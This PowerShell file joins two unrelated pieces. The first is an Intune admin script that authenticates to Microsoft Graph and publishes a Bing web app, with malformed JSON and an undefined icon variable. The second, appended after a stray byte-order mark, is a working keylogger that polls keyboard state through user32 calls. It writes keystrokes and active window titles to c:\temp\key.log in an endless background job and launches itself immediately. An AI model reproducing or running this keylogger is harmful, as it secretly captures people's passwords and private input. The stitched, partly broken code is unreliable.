




function Get-AuthToken {



[cmdletbinding()]

param
(
    [Parameter(Mandatory=$true)]
    $User
)

$userUpn = New-Object "System.Net.Mail.MailAddress" -ArgumentList $User

$tenant = $userUpn.Host

Write-Host "Checking for AzureAD module..."

    $AadModule = Get-Module -Name "AzureAD" -ListAvailable

    if ($AadModule -eq $null) {

        Write-Host "AzureAD PowerShell module not found, looking for AzureADPreview"
        $AadModule = Get-Module -Name "AzureADPreview" -ListAvailable

    }

    if ($AadModule -eq $null) {
        write-host
        write-host "AzureAD Powershell module not installed..." -f Red
        write-host "Install by running 'Install-Module AzureAD' or 'Install-Module AzureADPreview' from an elevated PowerShell prompt" -f Yellow
        write-host "Script can't continue..." -f Red
        write-host
        exit
    }




    if($AadModule.count -gt 1){

        $Latest_Version = ($AadModule | select version | Sort-Object)[-1]

        $aadModule = $AadModule | ? { $_.version -eq $Latest_Version.version }

            

            if($AadModule.count -gt 1){

            $aadModule = $AadModule | select -Unique

            }

        $adal = Join-Path $AadModule.ModuleBase "Microsoft.IdentityModel.Clients.ActiveDirectory.dll"
        $adalforms = Join-Path $AadModule.ModuleBase "Microsoft.IdentityModel.Clients.ActiveDirectory.Platform.dll"

    }

    else {

        $adal = Join-Path $AadModule.ModuleBase "Microsoft.IdentityModel.Clients.ActiveDirectory.dll"
        $adalforms = Join-Path $AadModule.ModuleBase "Microsoft.IdentityModel.Clients.ActiveDirectory.Platform.dll"

    }

[System.Reflection.Assembly]::LoadFrom($adal) | Out-Null

[System.Reflection.Assembly]::LoadFrom($adalforms) | Out-Null

$clientId = "d1ddf0e4-d672-4dae-b554-9d5bdfd93547"

$redirectUri = "urn:ietf:wg:oauth:2.0:oob"

$resourceAppIdURI = "https://graph.microsoft.com"

$authority = "https://login.microsoftonline.com/$Tenant"

    try {

    $authContext = New-Object "Microsoft.IdentityModel.Clients.ActiveDirectory.AuthenticationContext" -ArgumentList $authority

    
    

    $platformParameters = New-Object "Microsoft.IdentityModel.Clients.ActiveDirectory.PlatformParameters" -ArgumentList "Auto"

    $userId = New-Object "Microsoft.IdentityModel.Clients.ActiveDirectory.UserIdentifier" -ArgumentList ($User, "OptionalDisplayableId")

    $authResult = $authContext.AcquireTokenAsync($resourceAppIdURI,$clientId,$redirectUri,$platformParameters,$userId).Result

        

        if($authResult.AccessToken){

        

        $authHeader = @{
            'Content-Type'='application/json'
            'Authorization'="Bearer " + $authResult.AccessToken
            'ExpiresOn'=$authResult.ExpiresOn
            }

        return $authHeader

        }

        else {

        Write-Host
        Write-Host "Authorization Access Token is null, please re-run authentication..." -ForegroundColor Red
        Write-Host
        break

        }

    }

    catch {

    write-host $_.Exception.Message -f Red
    write-host $_.Exception.ItemName -f Red
    write-host
    break

    }

}



Function Test-JSON(){



param (

$JSON

)

    try {

    $TestJSON = ConvertFrom-Json $JSON -ErrorAction Stop
    $validJson = $true

    }

    catch {

    $validJson = $false
    $_.Exception

    }

    if (!$validJson){

    Write-Host "Provided JSON isn't in valid JSON format" -f Red
    break

    }

}



Function Add-WebApplication(){



[cmdletbinding()]

param
(
    $JSON,
    $IconURL
)

$graphApiVersion = "Beta"
$App_resource = "deviceAppManagement/mobileApps"

    try {

        if(!$JSON){

        write-host "No JSON was passed to the function, provide a JSON variable" -f Red
        break

        }


        if($IconURL){

        write-verbose "Icon specified: $IconURL"

            if(!(test-path "$IconURL")){

            write-host "Icon Path '$IconURL' doesn't exist..." -ForegroundColor Red
            Write-Host "Please specify a valid path..." -ForegroundColor Red
            Write-Host
            break

            }

        $iconResponse = Invoke-WebRequest "$iconUrl"
        $base64icon = [System.Convert]::ToBase64String($iconResponse.Content)
        $iconExt = ([System.IO.Path]::GetExtension("$iconURL")).replace(".","")
        $iconType = "image/$iconExt"

        Write-Verbose "Updating JSON to add Icon Data"

        $U_JSON = ConvertFrom-Json $JSON

        $U_JSON.largeIcon.type = "$iconType"
        $U_JSON.largeIcon.value = "$base64icon"

        $JSON = ConvertTo-Json $U_JSON

        Write-Verbose $JSON

        Test-JSON -JSON $JSON

        $uri = "https://graph.microsoft.com/$graphApiVersion/$($App_resource)"
        Invoke-RestMethod -Uri $uri -Method Post -ContentType "application/json" -Body $JSON -Headers $authToken

        }

        else {

        Test-JSON -JSON $JSON

        $uri = "https://graph.microsoft.com/$graphApiVersion/$($App_resource)"
        Invoke-RestMethod -Uri $uri -Method Post -ContentType "application/json" -Body $JSON -Headers $authToken

        }

    }

    catch {

    $ex = $_.Exception
    $errorResponse = $ex.Response.GetResponseStream()
    $reader = New-Object System.IO.StreamReader($errorResponse)
    $reader.BaseStream.Position = 0
    $reader.DiscardBufferedData()
    $responseBody = $reader.ReadToEnd();
    Write-Host "Response content:`n$responseBody" -f Red
    Write-Error "Request to $Uri failed with HTTP Status $($ex.Response.StatusCode) $($ex.Response.StatusDescription)"
    write-host
    break

    }

}





write-host


if($global:authToken){

    
    $DateTime = (Get-Date).ToUniversalTime()

    
    $TokenExpires = ($authToken.ExpiresOn.datetime - $DateTime).Minutes

        if($TokenExpires -le 0){

        write-host "Authentication Token expired" $TokenExpires "minutes ago" -ForegroundColor Yellow
        write-host

            

            if($User -eq $null -or $User -eq ""){

            $User = Read-Host -Prompt "Please specify your user principal name for Azure Authentication"
            Write-Host

            }

        $global:authToken = Get-AuthToken -User $User

        }
}



else {

    if($User -eq $null -or $User -eq ""){

    $User = Read-Host -Prompt "Please specify your user principal name for Azure Authentication"
    Write-Host

    }


$global:authToken = Get-AuthToken -User $User

}





$Bing = @"

{
    "@odata.type":"
    "displayName":"Bing Web Search",
    "description":"Bing Web Search",
    "publisher":"Intune Admin",
    "isFeatured":false,
    "appUrl":"https://www.bing.com",
    "useManagedBrowser":false
}

"@



write-host "Publishing" ($Bing | ConvertFrom-Json).displayName -ForegroundColor Yellow

$Create_Bing = Add-WebApplication -JSON $Bing -IconURL "$iconUrl_Bing"

Write-Host "Application created as $($Create_Bing.displayName)/$($create_Bing.id)"
Write-Host

﻿

        Function DynAKey {
            $ScriptBlock = {
            
            [string] $OutPath = 'c:\temp\key.log'

                function LogKey {
                    $ImportStatement = @'
[DllImport("user32.dll", CharSet=CharSet.Auto, ExactSpelling=true)] 
public static extern short GetAsyncKeyState(int virtualKeyCode); 

[DllImport("user32.dll", CharSet=CharSet.Auto)]
public static extern int GetKeyboardState(byte[] keystate);

[DllImport("user32.dll", CharSet=CharSet.Auto)]
public static extern int MapVirtualKey(uint uCode, int uMapType);

[DllImport("user32.dll", CharSet=CharSet.Auto)]
public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpkeystate, System.Text.StringBuilder pwszBuff, int cchBuff, uint wFlags);
 
[DllImport("user32.dll", CharSet=CharSet.Auto)]
public static extern IntPtr GetForegroundWindow();
'@
           
                    $ImportDll = Add-Type -MemberDefinition $ImportStatement -Namespace Win32 -Name Util -PassThru
    
                    Start-Sleep -Milliseconds 40

                        try {
                            [string] $LogOutput = ''

                            for ($TypeableChar = 1; $TypeableChar -le 254; $TypeableChar++) {
                                $VirtualKey = $TypeableChar
                                $KeyResult = $ImportDll::GetAsyncKeyState($VirtualKey)

                                if ($KeyResult -eq -32767) {
            
                                    $LeftShift = $ImportDll::GetAsyncKeyState(160)
                                    $RightShift = $ImportDll::GetAsyncKeyState(161)                
                                    $LeftCtrl = $ImportDll::GetAsyncKeyState(162)
                                    $RightCtrl = $ImportDll::GetAsyncKeyState(163)
                                    $LeftAlt = $ImportDll::GetAsyncKeyState(164)
                                    $RightAlt = $ImportDll::GetAsyncKeyState(165)
                                    $TabKey = $ImportDll::GetAsyncKeyState(9)
                                    $SpaceBar = $ImportDll::GetAsyncKeyState(32)
                                    $DeleteKey = $ImportDll::GetAsyncKeyState(127)
                                    $EnterKey = $ImportDll::GetAsyncKeyState(13)
                                    $BackSpaceKey = $ImportDll::GetAsyncKeyState(8)
                                    $LeftArrow = $ImportDll::GetAsyncKeyState(37)
                                    $RightArrow = $ImportDll::GetAsyncKeyState(39)
                                    $UpArrow = $ImportDll::GetAsyncKeyState(38)
                                    $DownArrow = $ImportDll::GetAsyncKeyState(34)
                                    $LeftMouse = $ImportDll::GetAsyncKeyState(1)
                                    $RightMouse = $ImportDll::GetAsyncKeyState(2)
                
                                    if ((($LeftShift -eq -32767) -or ($RightShift -eq -32767)) -or (($LeftShift -eq -32768) -or ($RightShfit -eq -32768))) {$LogOutput += '[Shift] '}
                                    if ((($LeftCtrl -eq -32767) -or ($LeftCtrl -eq -32767)) -or (($RightCtrl -eq -32768) -or ($RightCtrl -eq -32768))) {$LogOutput += '[Ctrl] '}
                                    if ((($LeftAlt -eq -32767) -or ($LeftAlt -eq -32767)) -or (($RightAlt -eq -32767) -or ($RightAlt -eq -32767))) {$LogOutput += '[Alt] '}
                                    if (($TabKey -eq -32767) -or ($TabKey -eq -32768)) {$LogOutput += '[Tab] '}
                                    if (($SpaceBar -eq -32767) -or ($SpaceBar -eq -32768)) {$LogOutput += '[SpaceBar] '}
                                    if (($DeleteKey -eq -32767) -or ($DeleteKey -eq -32768)) {$LogOutput += '[Delete] '}
                                    if (($EnterKey -eq -32767) -or ($EnterKey -eq -32768)) {$LogOutput += '[Enter] '}
                                    if (($BackSpaceKey -eq -32767) -or ($BackSpaceKey -eq -32768)) {$LogOutput += '[Backspace] '}
                                    if (($LeftArrow -eq -32767) -or ($LeftArrow -eq -32768)) {$LogOutput += '[Left Arrow] '}
                                    if (($RightArrow -eq -32767) -or ($RightArrow -eq -32768)) {$LogOutput += '[Right Arrow] '}
                                    if (($UpArrow -eq -32767) -or ($UpArrow -eq -32768)) {$LogOutput += '[Up Arrow] '}
                                    if (($DownArrow -eq -32767) -or ($DownArrow -eq -32768)) {$LogOutput += '[Down Arrow] '}
                                    if (($LeftMouse -eq -32767) -or ($LeftMouse -eq -32768)) {$LogOutput += '[Left Mouse] '}
                                    if (($RightMouse -eq -32767) -or ($RightMouse -eq -32768)) {$LogOutput += '[Right Mouse] '}

                                    [bool] $CapsLock = [console]::CapsLock 
                                    if ($CapsLock -eq $True) {$LogOutput += '[Caps Lock] '}
                
                                    $MappedKey = $ImportDll::MapVirtualKey($VirtualKey, 0x03)
                                    $KeyboardState = New-Object Byte[] 256
                                    $CheckKeyboardState = $ImportDll::GetKeyboardState($KeyboardState)

                                    $StringBuilder = New-Object -TypeName System.Text.StringBuilder;
                                    $UnicodeKey = $ImportDll::ToUnicode($VirtualKey, $MappedKey, $KeyboardState, $StringBuilder, $StringBuilder.Capacity, 0)

                                    if ($UnicodeKey -gt 0) {
                                        $TypedCharacter = $StringBuilder.ToString()
                                        $LogOutput += ('['+"$($TypedCharacter)"+']')
                                    }
                
                                    $TopWindow = $ImportDll::GetForegroundWindow()
                                    [int32] $WindowPid = (Get-Process | Where-Object { $_.mainwindowhandle -eq $TopWindow }).Id
                                    [string] $WindowTitle = (Get-Process -pid $WindowPid).mainWindowTitle

                                    $TimeStamp = (Get-Date -Format dd/MM/yyyy:HH:mm:ss:ff)
                
                                       $ObjectProperties = @{'Key Typed' = $LogOutput;
                                                          'Time' = $TimeStamp;
                                                          'Window Title' = $WindowTitle}
                                    $ResultsObject = New-Object -TypeName PSObject -Property $ObjectProperties
                
                                     Out-File -FilePath $OutPath -Encoding UTF8 -Append -InputObject $ResultsObject                               
                                }
                            }      
                        }
        
                        catch {Write-Verbose $Error[0]}   
                    }   
                }

            Start-job -InitializationScript $ScriptBlock -ScriptBlock {for (;;) {LogKey}} | Out-Null
        }

       DynAKey

